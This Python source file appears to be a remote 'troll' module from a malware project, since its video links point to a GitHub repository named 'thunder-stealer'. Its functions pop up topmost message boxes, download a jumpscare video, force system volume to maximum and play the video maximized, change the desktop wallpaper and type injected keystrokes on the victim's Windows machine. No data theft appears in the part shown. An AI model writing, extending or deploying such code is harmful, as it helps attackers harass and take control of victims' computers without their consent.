import ctypes
import threading
import requests
import os
import win32gui, win32con
import time
import tempfile
import pyautogui
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

 
# Constants for MessageBox styles
MB_OK = 0x0
MB_ICONINFORMATION = 0x40
MB_TOPMOST = 0x00040000

def show_message_box(title, message, style=0):
    """
    Display a message box using Windows API with MB_TOPMOST flag.
    :param title: The title of the message box.
    :param message: The text content of the message box.
    :param style: The style of the message box (buttons and icons).
    """
    ctypes.windll.user32.MessageBoxW(0, message, title, style | MB_TOPMOST)

def show_message_box_threaded(title, message, style=0):
    """
    Wrapper to run the message box in a separate thread.
    """
    threading.Thread(target=show_message_box, args=(title, message, style), daemon=True).start()



import pygame


class AudioPlayer:
    def __init__(self):
        pygame.mixer.init()  # Initialize the mixer
        self._player_thread = None
        self._stop_flag = threading.Event()

    def _play_audio(self, file_path):
        """Internal method to play audio."""
        try:
            # Load and play audio
            pygame.mixer.music.load(file_path)
            pygame.mixer.music.play()

            # Wait until the playback is finished or stopped
            while pygame.mixer.music.get_busy():
                if self._stop_flag.is_set():
                    pygame.mixer.music.stop()
                    break
        except Exception as e:
            print(f"Error during audio playback: {e}")

    def play(self, file_path):
        """
        Play an audio file in a separate thread.
        :param file_path: Path to the audio file.
        """
        if not os.path.exists(file_path):
            raise FileNotFoundError(f"Audio file not found: {file_path}")

        self.stop()  # Stop any currently playing audio

        # Reset the stop flag
        self._stop_flag.clear()

        # Create and start a new thread for audio playback
        self._player_thread = threading.Thread(target=self._play_audio, args=(file_path,))
        self._player_thread.daemon = True  # Ensures the thread exits with the main program
        self._player_thread.start()

    def stop(self):
        """
        Stop audio playback.
        """
        if self._player_thread and self._player_thread.is_alive():
            self._stop_flag.set()  # Signal the thread to stop
            self._player_thread.join()  # Wait for the thread to finish
            self._player_thread = None
            pygame.mixer.music.stop()  # Ensure the music is stopped immediately




class VolumeControl:
    def __init__(self):
        self._set_volume_api = ctypes.windll.user32.SystemParametersInfoW

    def set_volume(self, volume: int):
        """
        Set system volume.
        :param volume: Integer between 0 and 100 representing the desired volume level.
        """
        if not (0 <= volume <= 100):
            raise ValueError("Volume must be between 0 and 100.")
        
        try:
            # Calculate the volume value as a scale from 0 to 65535 (which Windows expects)
            volume_value = int(volume * 65535 / 100)

            # Using ctypes and the Windows API to set the master volume
            ctypes.windll.winmm.waveOutSetVolume(0, volume_value | (volume_value << 16))
        except Exception as e:
            raise RuntimeError(f"Failed to set volume: {e}")

    def get_volume(self):
        """Return the current system volume as an integer between 0 and 100."""
        try:
            volume = ctypes.c_uint()
            ctypes.windll.winmm.waveOutGetVolume(0, ctypes.byref(volume))
            volume_value = volume.value & 0xffff
            return int(volume_value * 100 / 65535)
        except Exception as e:
            raise RuntimeError(f"Failed to get volume: {e}")
        
class JumpscareHandler:
    def __init__(self):
        # Presets for different jumpscare videos
        self.presets = {
            "jeff_jumpscare": "https://github.com/python312/thunder-stealer/raw/refs/heads/main/base/jumpscare.mp4",
            "goofy_jumpscare": "https://github.com/python312/thunder-stealer/raw/refs/heads/main/base/funny.mp4"
        }
        self.temp_file = None

    def download_video(self, preset_name):
        """
        Download the jumpscare video based on the selected preset name.
        :param preset_name: The name of the preset (e.g., 'jeff_jumpscare').
        """
        if preset_name not in self.presets:
            return f"Preset '{preset_name}' not found."

        video_url = self.presets[preset_name]
        self.temp_file = os.path.join(tempfile.gettempdir(), f'{preset_name}.mp4')

        if not os.path.exists(self.temp_file):
            response = requests.get(video_url, stream=True)
            if response.status_code == 200:
                with open(self.temp_file, 'wb') as file:
                    for chunk in response.iter_content(chunk_size=1024):
                        file.write(chunk)
                return f"'{preset_name}' video downloaded successfully."
            else:
                return f"Failed to download '{preset_name}'. HTTP status code: {response.status_code}"
        else:
            return f"'{preset_name}' video already exists. Using existing file."

    def set_volume_to_max(self):
        """Set the system volume to maximum using PyCAW."""
        try:
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMasterVolumeLevelScalar(1.0, None)  # Set volume to 100%
            return "Volume set to maximum."
        except Exception as e:
            return f"Failed to set volume: {e}"

    def play_video_and_maximize(self):
        """Play the video using the default media player and maximize it."""
        if not self.temp_file or not os.path.exists(self.temp_file):
            return "No video found to play."

        try:
            os.startfile(self.temp_file)
            time.sleep(0.6)  # Give the media player some time to start
            video_window = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(video_window, win32con.SW_MAXIMIZE)
            return "Jumpscare has been triggered."
        except Exception as e:
            return f"Failed to play and maximize video: {e}"
        

def set_wallpaper(file_path):
    """Change the Windows wallpaper."""
    SPI_SETDESKWALLPAPER = 20
    SPIF_UPDATEINIFILE = 0x1
    SPIF_SENDCHANGE = 0x2

    # Validate the file path
    if not os.path.isfile(file_path):
        raise FileNotFoundError(f"Wallpaper file not found: {file_path}")

    # Convert to absolute path
    absolute_path = os.path.abspath(file_path)

    try:
        # Use the SystemParametersInfoW function to change the wallpaper
        result = ctypes.windll.user32.SystemParametersInfoW(
            SPI_SETDESKWALLPAPER, 0, absolute_path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
        )

        if not result:
            raise ctypes.WinError()

    except Exception as e:
        raise RuntimeError(f"Failed to set wallpaper: {e}")



def send_key_input(input : str):
    pyautogui.typewrite(input)